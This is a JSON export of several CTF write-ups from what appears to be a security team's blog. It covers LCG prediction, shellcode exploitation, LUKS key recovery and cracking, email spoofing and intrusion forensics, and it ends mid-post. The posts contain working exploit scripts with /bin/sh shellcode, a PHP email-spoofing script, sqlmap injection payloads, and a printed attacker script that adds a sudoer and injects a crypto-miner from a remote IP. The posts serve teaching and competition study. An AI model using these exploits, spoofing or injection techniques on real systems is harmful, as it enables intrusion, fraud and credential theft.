LG","slug":"Crypto-VolgaCtf2019-LG","date":"2019-03-31T15:19:21.000Z","updated":"2019-07-22T05:54:27.939Z","comments":true,"path":"2019/03/31/Crypto-VolgaCtf2019-LG/","link":"","permalink":"https://teamrocketist.github.io/2019/03/31/Crypto-VolgaCtf2019-LG/","excerpt":"","text":"LG 100 Description:WazzUP! My homie bought a new UltraSmartTV, but he forgot a secret key from an admin panel. After a few attempts to crack this “smart” IoT device it started to generate new passwords on its own, and now we are stuck. Identifying the problemThe first time I read the description of this task didn’t helped me at all I mean a LG television ? After doing connection with the server I saw the server was giving us some random numbers and asked us to predict the next. Well after this I remembered last year I was looking at an attack against Linear Congruential Generators (LCG) and I thought to myself this is probably a LCG because the title is similar LG. What is a LCG ?LCG can be defined as: Where: X(n) is a sequence of pseudo random values. p is modulo defined as 0 &lt; p a is the multiplier defined as 0 &lt; a &lt; p c is the increment 0 &lt;= c &lt; p ( if c = 0 the LCG is called Multiplicative Congruential Generator) An example implementation of LCG in python:12345678910class LCGPrng(object): def __init__(self, p, a, c): self.p = p self.a = a self.c = c self.x = random.randint(0, p) def next(self): self.x = (self.a*self.x + self.c) % self.p return self.x We have no knowledge of a,c and p and initial seed for x was chosen randomly, this attack is based in George Marsaglia analyzed Pseudo Random Number Generators in which he found a flaw in LCG. This can be done with 2x2 matrix or a 3x3 matrix, I used 2x2 matrix like this guy from here . For example if the out of the generated sequence is: 1234567X(0) = 64302589647963933737451564X(1) = 23099347408308738343740115X(2) = 60779187967701597680605077X(3) = 41531243105709646792416331X(4) = 71461317334046189800115379X(5) = 50094315434186546595562390X(6) = 27719142972686291997765807 From 7 numbers we can generate 4 2x2 matrices like this: If you wanted to do with 3x3 matrices they could be formed like this: The determinant of the matrix is an integer multiple of the modulus p used in LCG. The gcd of two random multiples of p will be p with probability 6/π^2 = 0.61 and if you take the gcd of all of this integers it should provide us the real modulus p with a higher probability. To calculate each determinant of the matrices above you need remember something from linear algebra classes, calculating a determinant from a 2x2 matrix is pretty trivial this can be done with this formula: Note that if you choose to go with the 3x3 matrices the calculation is in a different way. Now the GCD of these matrices should provide us with the real modulus p: 123p0 = GCD(DeterminantOfMatrix0, DeterminantOfMatrix1)p1 = GCD(p0, DeterminantOfMatrix2)P = GCD(p1, DeterminantOfMatrix3) Knowing p we can find a and c by solving simple equations: Finding a:Finding c:The next number is given by: The equivalent code to solve this is: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import sysimport mathimport randomfrom pwn import *def calc_det(i,j,X): \"\"\" Calculate the values for the matrix[lattice] \"\"\" a1 = X[i] - X[0] b1 = X[i+1] - X[1] a2 = X[j] - X[0] b2 = X[j+1] - X[1] \"\"\" Calculate the determinant \"\"\" det = a1*b2 - a2*b1 return abs(det)def GCD(a,b): \"\"\" Euclidean Algo\"\"\" a = abs(a) b = abs(b) while a: a,b = long(b%a),a return bdef modInverse(a, m): if GCD(a, m) != 1: return None # no mod inverse if a &amp; m aren't relatively prime u1, u2, u3 = 1, 0, a v1, v2, v3 = 0, 1, m while v3 != 0: q = u3 // v3 # // is the integer division operator v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3 return u1 % mdef main(): while True: try: X = [] r = remote('lg.q.2019.volgactf.ru', 8801) r.recvuntil(\"Try this:\\n\") for i in xrange(7): n =int(r.recvline().strip()) print n X.append(n) r.recvuntil(\"&gt;&gt;&gt;\") print '--------------' Det_X = [] Det_X.append(calc_det(1,2,X)) #print Det_X Det_X.append(calc_det(2,3,X)) #print Det_X Det_X.append(calc_det(3,4,X)) #print Det_X Det_X.append(calc_det(4,5,X)) #print Det_X found_p = reduce(GCD, Det_X) # To find 'a' and 'c' we need to solve the simple equation: # a = ((x3 - x4)*INVERSE_MODULE((x2-x3),p))%p # And: # c = (x4 - a*x3)%p # Where x2, x3, x4 are all numbers generated by the LCG that we got already! mod_inv_a = modInverse((X[2]-X[3]), found_p) # Here we find the modular inverse of x2-x3 with modulo p found_a = ((X[3] - X[4])*mod_inv_a)%found_p print found_a #found_a will be the correct a with high probability. found_c = (X[4] - found_a*X[3])%found_p print found_c #found_c will be the correct a with high probability, clearly depending on the correctness of a print \"Found: %d as P, %d as a and %d as c\" % (found_p, found_a, found_c) r.sendline(str((found_a * X[-1] + found_c) % found_p)) print r.recvall() r.close() break except TypeError: r.close()if __name__ == \"__main__\": sys.exit(main()) Running it:123456789101112131415161718$ python lol.py[+] Opening connection to lg.q.2019.volgactf.ru on port 8801: Done64708864023319939604022646518381540211898163541863792266147303737567749205101567787858287294194078929082655436130269655437579177566874743547788780197541492952410286788865373905332250--------------8376594058363858569363859597516389311801873802Found: 83765940583638585693638595 as P, 9751638931180187 as a and 3802 as c[+] Receiving all data: Done (64B)[*] Closed connection to lg.q.2019.volgactf.ru port 8801CONGRATULATIONS!VolgaCTF&#123;pR3d1ct1ng_1s_n0t_oNlY_f0r_0O0rAculs&#125; The flag was VolgaCTF{pR3d1ct1ng_1s_n0t_oNlY_f0r_0O0rAculs}","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"volgactf2019","slug":"volgactf2019","permalink":"https://teamrocketist.github.io/tags/volgactf2019/"},{"name":"lcg","slug":"lcg","permalink":"https://teamrocketist.github.io/tags/lcg/"},{"name":"randomness","slug":"randomness","permalink":"https://teamrocketist.github.io/tags/randomness/"}]},{"title":"[Pwn] BsidesSF 2019 - runitplusplus","slug":"Pwn-BsidesSF-2019-runitplusplus","date":"2019-03-06T02:17:09.000Z","updated":"2019-03-06T07:16:45.126Z","comments":true,"path":"2019/03/06/Pwn-BsidesSF-2019-runitplusplus/","link":"","permalink":"https://teamrocketist.github.io/2019/03/06/Pwn-BsidesSF-2019-runitplusplus/","excerpt":"","text":"runitplusplus 52 Description:This is the same as runit, except requires a bit of reversing! Grab the flag from /home/ctf/flag.txt Location - runitplusplus-a36bf652.challenges.bsidessf.net:5353 runitplusplus As the description says this is the same as the runit challenge but with a bit of reversing: The shell code I used for this was \\x31\\xC0\\x31\\xD2\\x31\\xC0\\x31\\xD2\\x50\\x68\\x2F\\x2F\\x73\\x68\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x50\\x53\\x89\\xE1\\xB0\\x0B\\xCD\\x80, if we use this website to check what this shellcode does: Everything looks right we are clearing EAX and EDX in the beginning, we are pushing the bin/sh string into the stack and put its address ECX the EDX must be zero because it’s the envp argument and EAX is 0xb which is the execve system call number, so now we just need to reverse this shell code, we can use python to do that in my case I used [::-1] which reverses the string: 1234567891011121314151617181920from pwn import *host = 'runitplusplus-a36bf652.challenges.bsidessf.net'port = 5353local = Truefilename = 'runitplusplus'def getConn(): #d = os.environ #d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253' return process(filename) if local else remote(host, port)SHELLCODE = '\\x31\\xC0\\x31\\xD2\\x50\\x68\\x2F\\x2F\\x73\\x68\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x50\\x53\\x89\\xE1\\xB0\\x0B\\xCD\\x80'[::-1]r = getConn()gdb.attach(r, ''' b *0x8048680 c ''')print r.recv()r.sendline(SHELLCODE)r.interactive() So lets put a break point right on the address 0x8048680 which is right before the program does CALL EAX and do a step in and lets what what happened to the shell code after running that for loop: So to circumvent this what I did is to repeat the first 4 bytes of my shell code which was the code for xor eax,eax and xor edx,edx: So we need to add this to our original shell code and we get this \\x31\\xC0\\x31\\xD2\\x31\\xC0\\x31\\xD2\\x50\\x68\\x2F\\x2F\\x73\\x68\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x50\\x53\\x89\\xE1\\xB0\\x0B\\xCD\\x80 which in assembly is: So lets check how it looks in gdb with the breakpoint: Now that everything is fine we are ready to run the script on the server: 1234567891011121314151617181920from pwn import *host = 'runitplusplus-a36bf652.challenges.bsidessf.net'port = 5353local = Falsefilename = 'runitplusplus'def getConn(): #d = os.environ #d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253' return process(filename) if local else remote(host, port)SHELLCODE = '\\x31\\xC0\\x31\\xD2\\x31\\xC0\\x31\\xD2\\x50\\x68\\x2F\\x2F\\x73\\x68\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x50\\x53\\x89\\xE1\\xB0\\x0B\\xCD\\x80'[::-1]r = getConn()#gdb.attach(r, '''# b *0x8048680# c# ''')print r.recv()r.sendline(SHELLCODE)r.interactive() Now running it: 123456789101112$ python runitplusplus.py [+] Opening connection to runitplusplus-a36bf652.challenges.bsidessf.net on port 5353: DoneSend me stuff!![*] Switching to interactive mode$ cat home/ctf/flag.txt&#123;ti_nar_uoy&#125;FTC[*] Got EOF while reading in interactive$ $ [*] Closed connection to runitplusplus-a36bf652.challenges.bsidessf.net port 5353[*] Got EOF while sending in interactive The flag was {ti_nar_uoy}FTC","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x86","slug":"Pwn/x86","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/"}],"tags":[{"name":"bsidesSF","slug":"bsidesSF","permalink":"https://teamrocketist.github.io/tags/bsidesSF/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"shellcode","slug":"shellcode","permalink":"https://teamrocketist.github.io/tags/shellcode/"}]},{"title":"[Forensics] BsidesSF 2019 - goodluks3","slug":"Forensics-BsidesSF-2019-goodluks3","date":"2019-03-05T22:57:04.000Z","updated":"2019-03-05T23:16:27.394Z","comments":true,"path":"2019/03/05/Forensics-BsidesSF-2019-goodluks3/","link":"","permalink":"https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks3/","excerpt":"","text":"goodluks3 Description:Our third suspect was caught with a running machine with the encrypted disk mounted.We captured the whole hard drive and system memory for you. Can you help us?(Please note, this is a rather large file!) https://storage.googleapis.com/bsides-sf-ctf-2019-large-artifacts/goodluks3.7zSolved After extracting this 7z file we get an image (goodluks3.img) and a memory dump (goodluks3.mem), eventually I tried to use volatility to analyse the memory but It was way too slow and I still needed to find a profile for this specific linux machine which is always a mess. Normally when you have a luks encryption disk and a memory dump in this kind of ctf challenges the objective is normally to find the master key within the dump. So I tried to use aesfindkey on the memory dump but It didn’t find anything, after this I started to look for a different tool and I found this one: 123456$ ./findaes ../goodluks3.memSearching ../goodluks3.memFound AES-256 key schedule at offset 0x895dd88: b0 7a 29 f5 44 15 47 76 57 04 6e ec d3 03 f5 bd af a4 e6 df b2 71 01 ab af 7e 22 e1 23 94 15 f5 Found AES-256 key schedule at offset 0x895df78: 8e 8c 3a 67 eb 11 54 6c b1 cc 7d 0f cc 85 e8 43 30 7c 16 d4 7f 86 08 a1 0f 59 3d 4c 31 0f c8 6a It found two AES-256 keys, It is time to set up our loop device from the luks image, so lets look at the partitions on parted: 12345678910111213141516171819$ sudo parted goodluks3.imgGNU Parted 3.2Using ~/ctf/bctf/forensics/goodluks3/goodluks3.imgWelcome to GNU Parted! Type 'help' to view a list of commands.(parted) U Unit? [compact]? B (parted) print Model: (file)Disk ~/ctf/bctf/forensics/goodluks3/goodluks3.img: 4294967296BSector size (logical/physical): 512B/512BPartition Table: msdosDisk Flags: Number Start End Size Type File system Flags 1 1048576B 2999975935B 2998927360B primary ext4 boot 2 2999975936B 4000317439B 1000341504B primary 3 4000317440B 4293918719B 293601280B primary linux-swap(v1)(parted) We want to set a loop device on number 2 which its offset starts at 2999975936B so lets use losetup: 1$ sudo losetup --offset 2999975936 /dev/loop0 goodluks3.img And now lets convert one of the dumped keys into a file and decode them into ASCII: 1$ echo &apos;8e 8c 3a 67 eb 11 54 6c b1 cc 7d 0f cc 85 e8 43 30 7c 16 d4 7f 86 08 a1 0f 59 3d 4c 31 0f c8 6a&apos; | tr -d &apos; &apos; | xxd -r -p &gt; key0 Lets try to decrypt now: 12sudo cryptsetup luksOpen --master-key-file key0 /dev/loop14 decryptedCannot read 64 bytes from keyfile key0. And we got an error ? They expected a 64 byte key which means the encryption used was AES-512 and not AES-256, after this I remembered that we got two AES-256 from findaes, what if the full keys is the two keys joined? so lets try that: 12$ echo '8e 8c 3a 67 eb 11 54 6c b1 cc 7d 0f cc 85 e8 43 30 7c 16 d4 7f 86 08 a1 0f 59 3d 4c 31 0f c8 6a b0 7a 29 f5 44 15 47 76 57 04 6e ec d3 03 f5 bd af a4 e6 df b2 71 01 ab af 7e 22 e1 23 94 15 f5' | tr -d ' ' | xxd -r -p &gt; key0$ sudo cryptsetup luksOpen --master-key-file key0 /dev/loop0 decrypted And it worked! the command didn’t spit any kind of errors so lets mount it and get the flag: 12345$ sudo mount /dev/mapper/decrypted /mnt/$ ls /mnt/collected-wallpapers-master/ ctfscoreboard-master/ flag.txt lost+found/$ cat /mnt/flag.txt CTF&#123;lucky_U_k33p_secrets!&#125; The flag was CTF{lucky_U_k33p_secrets!}","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"bsidesSF","slug":"bsidesSF","permalink":"https://teamrocketist.github.io/tags/bsidesSF/"},{"name":"luks","slug":"luks","permalink":"https://teamrocketist.github.io/tags/luks/"},{"name":"masterkey","slug":"masterkey","permalink":"https://teamrocketist.github.io/tags/masterkey/"}]},{"title":"[Forensics] BsidesSF 2019 - goodluks2","slug":"Forensics-BsidesSF-2019-goodluks2","date":"2019-03-05T02:18:25.000Z","updated":"2019-03-05T02:24:59.325Z","comments":true,"path":"2019/03/05/Forensics-BsidesSF-2019-goodluks2/","link":"","permalink":"https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks2/","excerpt":"","text":"goodluks2100 Description:Our first insider threat has lead to a second insider. We haven’t found any clues to the passphrase here, but given thevocabulary of the suspect, I don’t think you’ll have a hard time. https://storage.googleapis.com/bsides-sf-ctf-2019-large-artifacts/goodluks2.7z We have disk image and by the name of the challenge and the description we can already guess that it’s encrypted with luks 12$ file goodluks2.img goodluks2.img: DOS/MBR boot sector; partition 1 : ID=0x83, start-CHS (0x0,32,33), end-CHS (0x51,85,4), startsector 2048, 67106816 sectors, extended partition table (last) We don’t any more files so we need to actually brute force the passphrase, so let’s try using hashcat for this. But First of all we need to set up a loop device of our image, we need to check the partitions with parted and look at the offset: 12345678910111213$ sudo parted goodluks2.img GNU Parted 3.2(parted) U Unit? [compact]? B (parted) print Model: (file)Disk ~/ctf/bsidectf/forensics/goodluks2/goodluks2.img: 34359738368BSector size (logical/physical): 512B/512BPartition Table: msdosDisk Flags: Number Start End Size Type File system Flags 1 1048576B 34359738367B 34358689792B primary We want to loop the primary partition so we want to use losetup at 1048576 offset: 12345$ ls /dev/loop*/dev/loop0 /dev/loop1 /dev/loop2 /dev/loop3 /dev/loop4 /dev/loop5 /dev/loop6 /dev/loop7 /dev/loop-control$ sudo losetup --offset 1048576 /dev/loop8 goodluks2.img$ ls /dev/loop*/dev/loop0 /dev/loop1 /dev/loop2 /dev/loop3 /dev/loop4 /dev/loop5 /dev/loop6 /dev/loop7 /dev/loop8 /dev/loop-control Now that we have to extract the luks header which will contain the hash for us to crack, we can use dd but first we need to locate the offset to the header, we can do this with cryptsetup luksDump: 12345678910111213141516171819202122232425262728sudo cryptsetup luksDump /dev/loop8 LUKS header information for /dev/loop8Version: 1Cipher name: aesCipher mode: cbc-essiv:sha256Hash spec: sha1Payload offset: 4096MK bits: 256MK digest: f9 88 ef ee 9e 28 aa 8c 5a 9e ca 1b fa 50 f6 1b be b7 db 85 MK salt: 5b b3 77 d8 e9 dd 1f ea 61 b1 21 20 53 54 e1 e1 b4 fd 11 21 bf 41 67 6f 9d 80 62 f3 b1 2f 6c dd MK iterations: 132387UUID: 4e42c516-dc27-402d-872b-a086739d7e2fKey Slot 0: ENABLED Iterations: 10260 Salt: 73 2d 5e e0 7e 99 40 8c ff ca de 32 c4 2d e0 cd 1b 6d ad b9 39 08 b5 c5 09 04 af 64 28 d5 bd a9 Key material offset: 8 AF stripes: 4000Key Slot 1: DISABLEDKey Slot 2: DISABLEDKey Slot 3: DISABLEDKey Slot 4: DISABLEDKey Slot 5: DISABLEDKey Slot 6: DISABLEDKey Slot 7: DISABLED The payload offset is 4096, now finally we can extract the hash with dd: 1$ sudo dd if=/dev/loop8 of=LUKS_Header.dd bs=521 count=4096 Now we just need to crack with hashcat, I used the password list named rockyou.txt you can find it easily on the internet it took approximately 14 minutes with both CPU and GPU running: After cracking it (gaffer3) we just need decrypt and mount the disk to get the flag! 1234567$ sudo cryptsetup luksOpen /dev/loop11 bkupEnter passphrase for ~/ctf/bsidectf/forensics/goodluks2/goodluks2.img: gaffer3$ sudo mount /dev/mapper/bkup /mnt/$ ls /mnt/flag.txt JohnTheRipper.7z lost+found rockyou.7z$ cat /mnt/flag.txt CTF&#123;lame_users_keys_suck&#125; The flag was CTF{lame_users_keys_suck}","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"bsidesSF","slug":"bsidesSF","permalink":"https://teamrocketist.github.io/tags/bsidesSF/"},{"name":"luks","slug":"luks","permalink":"https://teamrocketist.github.io/tags/luks/"},{"name":"hashcat","slug":"hashcat","permalink":"https://teamrocketist.github.io/tags/hashcat/"},{"name":"dictionaryAttack","slug":"dictionaryAttack","permalink":"https://teamrocketist.github.io/tags/dictionaryAttack/"}]},{"title":"[MISC] TAMUctf - Onboarding Checklist","slug":"MISC-TAMUctf-Onboarding-Checklist","date":"2019-03-04T11:16:45.000Z","updated":"2019-03-04T11:26:38.922Z","comments":true,"path":"2019/03/04/MISC-TAMUctf-Onboarding-Checklist/","link":"","permalink":"https://teamrocketist.github.io/2019/03/04/MISC-TAMUctf-Onboarding-Checklist/","excerpt":"","text":"Onboarding Checklist465 Description:From: importantperson@somebigcorp.comDate: Feb 22, 2019 9:00 AMTo: someguy@somebigcorp.comSubject: New Employee Access Hello Some Guy,We need to begin sending requests for the new employee to get access to our security appliances. I believe they already know that you are authorized to make a new account request. Would you mind sending the new employee’s email address to tamuctf@gmail.com so they can process the account request?Thank you,Important Person The new employee can be a little slow to respond. Difficulty: easy 2/26 8:42 am CST: Visting somebigcorp.com is not part of the challenge The goal of this challenge is clear. Send an email to tamuctf@gmail.com requesting the credentials for the new employee. Although … we need to be disguised as someguy@somebigcorp.com in order to request the credentials. How? *Email spoofing is the forgery of an email header so that the message appears to have originated from someone or somewhere other than the actual source.* To use this technique there is a perfect PHP function called mail(). All we need is a PHP server and an email server (check it up how to setup one on google if you don’t know how to do it) 1234&lt;?phpmail ( string $to , string $subject , string $message [, [mixed] $additional_headers [, string $ additional_parameters ]] ) : bool?&gt; The most important parameters in this case are: From and Reply-To in the additional headers section. In the From argument we put the email we want to spoof and in the Reply-To we chose the email where we want the people that we fooled to send the replies, in this case we want to fool tamuctf@gmail.com. So to retrieve the flag all we need is: PHP Server Email Server An email where we can receive the credentials (let’s call it examplemail@10minutemail.com) Call the PHP mail() function from the server. Put the email where we want to receive the info into the body of the mail()’s message Let’s create the file imnotspoofing.php with the following content12345678910111213&lt;?php$to= 'tamuctf@gmail.com';$subject = 'Requesting new employee credentials';$message= 'Hello. I am request the new employee credentials. Can you send them to my email examplemail@10minutemail.com. Thanks'$headers = array( 'From: someguy@somebigcorp.com', 'Reply-To: examplemail@10minutemail.com', 'X_Mailer: PHP/' . phpversion() );mail($to, $subject, $message, implode(\"\\n\", $headers));?&gt; Shortly after we running this PHP snippet from our server, we’ll receive an email in our examplemail@10minutemail.com with the flag: FLAG: gigem{wuT_4n_31337_sp0ofer_494C4F5645594F55}","categories":[{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/categories/Misc/"}],"tags":[{"name":"mailSpoofing","slug":"mailSpoofing","permalink":"https://teamrocketist.github.io/tags/mailSpoofing/"}]},{"title":"[Forensics] TAMUctf - DriveByInc","slug":"Forensics-TAMUctf-DriveByInc","date":"2019-03-03T22:04:16.000Z","updated":"2019-03-04T02:35:18.217Z","comments":true,"path":"2019/03/03/Forensics-TAMUctf-DriveByInc/","link":"","permalink":"https://teamrocketist.github.io/2019/03/03/Forensics-TAMUctf-DriveByInc/","excerpt":"","text":"0_intrusion0_intrusion100Welcome to Drive By Inc. We provide all sorts of logistical solutions for our customers.Over the past few years we moved to hosting a large portion of our business on a nice looking website.Recently our customers are complaining that the front page of our website is causing their computers to run extremely slowly.We hope that it is just because we added too much javascript but can you take a look for us just to make sure?1. What is the full malicious line? (Including any HTML tags) For the first part we needed to find the malicious line on this html file, after analysing it we found a malicious line using a known javascript miner api we could also note that the API was being loaded from an external server which the ip is 10.187.195.95. The answer was: 1&lt;script src = http://10.187.195.95/js/colorbox.min.js&gt;&lt;/script&gt;&lt;script&gt;var color = new CoinHive.Anonymous(\"123456-asdfgh\");color.start()&lt;/script&gt;&lt;/body&gt; 1_logs1_logs100Strange.We don’t know how that got there.We have since gone and removed the offending lines.Maybe one of our developers wanted to make some money on the side.Here is a pcap and some web server logs from the day that users started complaining.Can you figure out if something nefarious happened while we go talk to the devs?Link to pcapWhat is the ip of the attacker?What ports did they find open? (List low to high ex: 1,2,3)What are the names of the web files they found on the server? (List in alphabetical order comma separated ex: a.html,a.php,b.html)2/23 1:08 am CST add forgotten log files 2/23 8:29 am CST add slight clarification to 2 What is the ip of the attacker?Now that we have a network capture we can start analysing the network, so for the first question we remembered that there was a JavaScript file being loaded from an ip 10.187.195.95 from the previous part, so we tried to answer that and we got the 1st question, that was indeed the ip from the attacker. What ports did they find open? (List low to high ex: 1,2,3)After this we started to analyse the pcap with this filter ip.src == 10.187.195.95 || ip.dst == 10.187.195.95 with this we removed all the irrelevant packets for the problem. By reading the question we can already know the attacker did a port scan on the server probably used nmap or something so to apply the right filters on tshark and extract the ports we need to know how a port scan works in practice. By just looking at Wireshark in the beginning we can see the attacker used a tcp syn scan: As you can see the attacker issues a lot of syns and receives from the server lot of answers from the server as RST,ACK (wireshark changes the color of this packets to red), RST,ACK means the port is closed… Resuming how a SYN scan works: An attacker issues a SYN, if the server replies SYN,ACK : It means the port is open! An attacker issues a SYN, if the server replies RST,ACK : It means the port is closed! An attacker issues a SYN, if the server does not reply, or replies with ICMP error : it means that port is filtered. Likely an IDS / stateful firewall block your request. So now we need to start working on our tshark command, we need to check which tcp.flags replies with SYN,ACK it needs to come from the server with destination to the attacker IP, the field on wireshark to filter the protocol is ip.proto and the number for TCP protocol is 6, the way I do to find out the name of the fields on wireshark is by doing this: First you choose the field you want to filter:Then a website will open and search for the field you want to filter in this case is “Protocol”:Now you do the same for the tcp flags, to know the number when a SYN,ACK occurs we need to find a successful response to know the number and after we find it we know we need to use tcp.flags == 0x12 filter:The final script is:123$ tshark -r capture.pcap -Y \"ip.dst == 10.187.195.95 &amp;&amp; ip.proto == 6 &amp;&amp; tcp.flags == 0x00000012\" -Tfields -e tcp.srcport | sort -u2280 The answer to the 2nd question is 22,80. What are the names of the web files they found on the server? (List in alphabetical order comma separated ex: a.html,a.php,b.html)So for this I used wireshark, I used the first filter ip.src == 10.187.195.95 || ip.dst == 10.187.195.95 &amp;&amp; http to filter only http packets and now we need to know the replies from the server the ones that answer with a 200 status code, we can see the attacker ran a script with a list of files, the server will reply 404 on files that don’t exist and 200 on the ones that exist… So I used a second filter on wireshark to catch the 200 responses, you can do this by doing EDIT -&gt; Find packet, after this a bunch of buttons will appear below the first filter:If you keep clicking on find it will jump to the next 200 OK, you need to keep looking at the request from the attacker to know which file he’s searching and the response of the server to check if is 200 OK, for example in the image above he did a GET request to / and received a 200 OK meaning that page exist. So with this I keep clicking find and I got all the files I needed which the list is : The answer was:1about.html,adminlogin.html,adminlogin.php,contact.html,gallery.html,index.html,services.html,typo.html With this method I also found an interesting file named backup.sh which will be useful for the next steps:1234567891011121314#!/bin/bashif ! id -u devtest2; then mkdir /home/devtest2 useradd --home=/home/devtest2 -s /bin/bash devtest2 echo \"devtest2:HYf6lEMhUM4Z0b079X\" | chpasswd chown devtest2:devtest2 /home/devtest2 echo 'devtest2 ALL=(ALL:ALL) ALL' &gt;&gt; /etc/sudoersfisudo cat /var/www/html/index.html | grep \"miner.js\"if [ $? != 0 ]; then sed -i 's/&lt;\\/body&gt;/&lt;script src = http:\\/\\/10.187.195.95\\/js\\/colorbox.min.js&gt;&lt;\\/script&gt;&lt;script&gt;var color = new CoinHive.Anonymous(\"123456-asdfgh\");color.start()&lt;\\/script&gt;&lt;\\/body&gt;/g' /var/www/html/index.htmlfi 2_AnalysisApparently none of the devs knew what were talking about.Thanks to your initial findings it looks like this may have been an outside attack.Using the logs we already gave you can you dig deeper and see if you can find more information? In the meantime we will try and get files for you to look at.What time in UTC did the initial scanning start? (mm/dd/yyyy:hh:mm:ss)What is the name of the first tool used?What is the version string of the third tool used?What page was attacked with the third tool?2/22 10:49 pm CST updated format on question 1 2/23 12:37 pm CST updated timestamp solution for 1 What time in UTC did the initial scanning start? (mm/dd/yyyy:hh:mm:ss)This question got me a a lot of time simply because they are asking in UTC time zone , I think Wireshark was showing the name on my timezone so I had the adapt the date by subtracting one hour, we need to find the date when the first SYN request was done we can do this with the initial filter we used:The correct date was 05/22/2018:19:07:35 , which was subtracted by 1 hour from what Wireshark was giving me for other people probably you would need to do different things depending on you time zone. What is the name of the first tool used?I eventually just tried nmap and immediately got the right answer but there are other ways to detect if nmap was used for scanning, you can read this blog post I didn’t used but it’s a really interesting read. What is the version string of the third tool used?So we know the second tool used was probably a tool like dir buster to find files on the server, so after finding the existing files is time to check which requests he used on the found files, the more interesting file to look at is the adminlogin.php because it’s a php file and it has communication with the server which was probably the one the attacker used so lets check the user-agent used: The version string was:sqlmap/1.2.4#stable What page was attacked with the third tool?This is already answer form the previous question :) the page is adminlogin.php . 3_ForensicsUnfortunately it looks like the attackers used pretty standard tools to hack into our website.It looks like they didn’t modify the web page from the admin interface on the website though.They probably logged into the webserver somehow. Can you see if you can find out how they got credentials to log in?1 - List the compromised usernames in comma separated alphabetical order (website users)2 - What username and password combo were the attackers most likely able to get a hold of? (format as username:password) 1 - List the compromised usernames in comma separated alphabetical order (website users)We already know the attacker used sqlmap for the attack, if you know how sqlmap works it starts by trying alot of queries to find the vulnerability and find the right payload to attack, we can ignore the first requests and start looking at when sqlmap started dumping the database: So as we can see above the database dumping started at package nr 333806, and it starts for dumping the database, to understand the rest we need to understand the sql query sqlmap used. So the query used to extract the database name: 1GET /adminlogin.php?username=adsf' UNION ALL SELECT NULL,CONCAT(0x716b7a6271,IFNULL(CAST(DATABASE() AS CHAR),0x20),0x7171627871),NULL-- jaLN&amp;password=adsf HTTP/1.1 As you can see he’s using union query to concat two additional strings 0x716b7a6271 and 0x7171627871 if we decode both from hex to string we get: 1234$ echo '716b7a6271' | xxd -r -pqkzbq⏎ $ echo '7171627871' | xxd -r -pqqbxq⏎ Sqlmap uses this strings to easily parse content that’s why the output of the request comes very weird like this: 1&lt;html&gt;You logged in as qkzbqSqliDBqqbxq&lt;/html&gt; Just remove both qkzbq and qqbxq and you get SqliDB which is the database name. Now we don’t really care about the database names and table names so we can skip the next requests and look to when they started dumping the usernames and passwords. Request to get the users count number:1GET /adminlogin.php?username=adsf' UNION ALL SELECT NULL,CONCAT(0x716b7a6271,IFNULL(CAST(COUNT(*) AS CHAR),0x20),0x7171627871),NULL FROM SqliDB.Users-- qKQB&amp;password=adsf HTTP/1.1\\r\\n Output of the users number:1&lt;html&gt;You logged in as qkzbq5qqbxq&lt;/html&gt; Removing the parse strings:1&lt;html&gt;You logged in as 5&lt;/html&gt; Request to get the 3rd user on the database id, password, username:1GET /adminlogin.php?username=adsf' UNION ALL SELECT NULL,(SELECT CONCAT(0x716b7a6271,IFNULL(CAST(ID AS CHAR),0x20),0x797570747270,IFNULL(CAST(Password AS CHAR),0x20),0x797570747270,IFNULL(CAST(`User` AS CHAR),0x20),0x7171627871) FROM SqliDB.Users LIMIT 2,1),NULL-- tpEN&amp;password=adsf HTTP/1.1 Output:1&lt;html&gt;You logged in as qkzbq1yuptrp7a4434d48772fee914a99590376ee438yuptrpadminqqbxq&lt;/html&gt; Removing the parse strings:1&lt;html&gt;You logged in as 1 7a4434d48772fee914a99590376ee438 admin&lt;/html&gt; Now you just do the same for the rest of the queries and you get a list of users: 123451 7a4434d48772fee914a99590376ee438 admin2 2e107f8e7aaf178bf00e58c09abfba08 devtest3 5f836ac3e2ea2b22227c940754283fde suzy4 442f0577be5c6e59a77047eaa37b15c6 bob5 5efb309c9b1dc4e90fa136a64e3902e0 alice The answer for this question was:1admin,alice,bob,devtest,suzy 2 - What username and password combo were the attackers most likely able to get a hold of? (format as username:password)Since we got the list of users and passwords the only one was searchable on the internet was devtest md5 hash the password of devtest was driveby so the answer to this question is: 1devtest:driveby 4_privilege_escalationWe will have to get on to the devs for leaving that account on the website and machine.Some good news is that we finally obtained a disk image of the machine.If the attacker modified the web files on the server they must have had higher privileges than the account you found.See if you can find some information about how they could have done so.Link to disk image (10 GB unzipped)What is the md5sum of the file that was most likely used or found by the attackers to get higher privileges?What account were the attackers able to escalate to?What is the password for that account? What is the md5sum of the file that was most likely used or found by the attackers to get higher privileges?After mounting the the image: 12sudo mkdir /mnt/roflsudo mount -o ro,noload,noexec filesystem.image /mnt/rofl So after checking the home folder of ubuntu user i saw that setup.sh had read permissions for everyone on that setup.sh file 123456789ls -ltah home/ubuntu/total 